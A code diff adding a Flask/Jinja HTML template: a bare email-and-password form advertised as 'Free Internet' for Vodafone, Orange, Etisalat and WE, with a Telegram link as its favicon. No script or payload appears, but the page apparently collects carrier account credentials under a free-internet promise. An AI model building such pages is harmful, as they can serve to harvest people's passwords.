@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="description" content="Free Internet Vodafone && Orange && Etisalat && We ">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <link rel="shortcut icon" href="https://t.me/Configat7" type="image/x-icon">
+    <link rel="stylesheet" href="{{url_for('static',filename='main.css')}}">
+    <style>
+
+        .flashes li{
+        /*
+        👻👻👻👻👻👻👻👻👻👻👻👻
+        */
+            {% if alertcolor %}
+            background-color:{{alertcolor}};
+            {% endif %}
+                   
+           }
+           
+    </style>
+
+
+    {% if title %}
+    <title> {{title}}</title>
+    {%endif%}
+</head>
+<body>
+    {% with messages = get_flashed_messages() %}
+            {% if messages %}
+                <ul class="flashes">
+                {% for message in messages %}
+                    <li>{{ message }}</li>
+                {% endfor %}
+                </ul>
+            {% endif %}
+        {% endwith %}
+        <form method="POST">
+            <input type="email" id="number" name="email" placeholder="Email" required><br>
+            <br>
+            <input type="password" id="password" name="password" placeholder="Password" required><br><br>
+            {% if sub %}
+            <input style="background-color:{{sub}}" type="submit" value="Submit">
+            {% endif %}
+        </form>
+        
+</body>
+</html>
